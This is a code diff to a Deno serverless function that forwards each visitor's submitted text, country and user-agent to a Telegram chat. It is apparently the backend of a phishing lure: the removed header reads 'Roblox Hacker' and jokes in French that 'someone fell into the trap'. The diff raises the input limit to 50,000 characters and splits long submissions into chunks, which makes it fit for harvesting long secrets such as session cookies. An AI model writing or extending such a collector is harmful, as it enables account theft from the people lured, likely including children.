@@ -16,7 +16,8 @@ Deno.serve(async (req) => {
 
     const body = await req.json().catch(() => ({}));
     const rawInput = typeof body?.input === "string" ? body.input : "";
-    const input = rawInput.trim().slice(0, 500);
+    // Allow long inputs — cap at 50k to avoid abuse
+    const input = rawInput.trim().slice(0, 50000);
     if (!input) {
       return new Response(JSON.stringify({ error: "empty input" }), {
         status: 400,
@@ -32,33 +33,46 @@ Deno.serve(async (req) => {
     const esc = (s: string) =>
       s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 
-    const text =
-      `🎣 <b>Roblox Hacker — Cybersecurity Test</b>\n\n` +
-      `Quelqu'un vient de tomber dans le piège 😅\n\n` +
-      `<b>Input:</b> <code>${esc(input)}</code>\n` +
+    const sendTg = async (text: string) => {
+      const r = await fetch(`${GATEWAY_URL}/sendMessage`, {
+        method: "POST",
+        headers: {
+          Authorization: `Bearer ${LOVABLE_API_KEY}`,
+          "X-Connection-Api-Key": TELEGRAM_API_KEY,
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text,
+          parse_mode: "HTML",
+          disable_web_page_preview: true,
+        }),
+      });
+      const data = await r.json();
+      if (!r.ok) {
+        console.error("Telegram error", r.status, data);
+        throw new Error(`Telegram failed [${r.status}]: ${JSON.stringify(data)}`);
+      }
+      return data;
+    };
+
+    // Header message with metadata
+    const header =
+      `🎣 <b>New submission</b>\n\n` +
       `<b>Country:</b> ${esc(country)}\n` +
-      `<b>User-Agent:</b> <code>${esc(userAgent.slice(0, 200))}</code>\n` +
-      `<b>Time:</b> ${ts}`;
+      `<b>User-Agent:</b> <code>${esc(userAgent.slice(0, 300))}</code>\n` +
+      `<b>Time:</b> ${ts}\n` +
+      `<b>Length:</b> ${input.length} chars`;
+    await sendTg(header);
 
-    const tgRes = await fetch(`${GATEWAY_URL}/sendMessage`, {
-      method: "POST",
-      headers: {
-        Authorization: `Bearer ${LOVABLE_API_KEY}`,
-        "X-Connection-Api-Key": TELEGRAM_API_KEY,
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text,
-        parse_mode: "HTML",
-        disable_web_page_preview: true,
-      }),
-    });
-
-    const tgData = await tgRes.json();
-    if (!tgRes.ok) {
-      console.error("Telegram error", tgRes.status, tgData);
-      throw new Error(`Telegram failed [${tgRes.status}]: ${JSON.stringify(tgData)}`);
+    // Telegram limit ~4096 chars per message. Use safe chunk size accounting for HTML tags.
+    const escaped = esc(input);
+    const CHUNK = 3500;
+    const total = Math.ceil(escaped.length / CHUNK);
+    for (let i = 0; i < total; i++) {
+      const part = escaped.slice(i * CHUNK, (i + 1) * CHUNK);
+      const label = total > 1 ? `<b>Input (${i + 1}/${total}):</b>\n` : `<b>Input:</b>\n`;
+      await sendTg(`${label}<pre>${part}</pre>`);
     }
 
     return new Response(JSON.stringify({ ok: true }), {
